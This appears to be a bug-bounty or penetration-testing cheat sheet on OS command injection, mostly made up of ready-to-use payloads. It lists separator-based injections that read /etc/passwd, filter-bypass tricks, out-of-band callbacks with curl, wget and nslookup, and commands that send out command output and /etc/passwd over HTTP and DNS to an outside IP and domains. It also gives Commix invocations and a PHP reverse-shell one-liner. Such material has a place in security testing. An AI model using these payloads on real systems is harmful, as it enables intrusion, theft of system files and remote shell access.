# Detection
- We should guess background running command.
- Command Separators
  ```bash
  ; cat /etc/passwd
  & cat /etc/passwd
  && cat /etc/passwd
  | cat /etc/passwd
  || cat /etc/passwd
  `cat /etc/passwd`
  $(cat /etc/passwd)
  {cat,/etc/passwd}
  ```
- Bypass
  ```bash
  %0als                                  # JUST in BURPSUITE
  %0dls
  cat$IFS/etc/passwd                     # $IFS  =>  space
  cat ${HOME:0:1}etc${HOME:0:1}passwd    # ${HOME:0:1}  =>  slash
  ```
- Out of Band
  ```bash
  [command seprator] curl cvefix.ir:8080           # nc -lvp 8080
  `wget https://cvefix.ir/OOB`
  $(wget https://cvefix.ir/OOB)
  {wget,https://cvefix.ir/OOB}
  email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
  ```

# Data Exfilteration
### HTTP
```bash
curl 49.13.57.86:12345 -d "$(id)"                   # Sending out the result of a command
curl 49.13.57.86:12345 --data-binary @/etc/passwd   # Sending out a file
```

### DNS
```bash
# Simple
dig a +short $(whoami).icollab.info

# When data contains space or binary characters
uname -a | od -A n -t x1 | sed 's/ *//g' | while read exfil; do ping -c 1 $exfil.host.tld; done
echo "446...40a" | xxd -r -p            # Extract data from output of previous command
```

# Commix
- https://github.com/commixproject/commix/wiki/Usage
- https://github.com/commixproject/commix/wiki/Usage-Examples
- https://github.com/commixproject/commix/wiki/Filters-Bypasses
  ```bash
  python3 commix.py -r [requestFile] -p [parameter]
  python3 commix.py -r req -p email --level=2 --technique=T        # Time-Based (Blind)
  python3 commix.py -r req -p email --level=2 --technique=f        # File-Based
  ```

# Tip
- In Bug-Bounty we just have out-of-band.
- Generate payload in [revshells](https://www.revshells.com).
  ```bash
  ;php -r '$sock=fsockopen("cvefix.ir",8080);exec("sh <&3 >&3 2>&3");'
  ```
- Search in request and response for `-` that is indicator of os command.
- Internal servers of banks, has no internet, and we can not use OOB techniques.
- `-` is filtered  →  Use file scheme `file:///etc/passwd`.
- Inconsistency: Curl convert these payloads to `ile:///etc/passwd`:
  ```bash
  file\:/etc/passwd
  {file}:/etc/passwd
  ```
- Add `echo` to see the end of backend command.
- Check `'` and `"` to breka hte input context.

# Resource
- https://book.hacktricks.xyz/pentesting-web/command-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
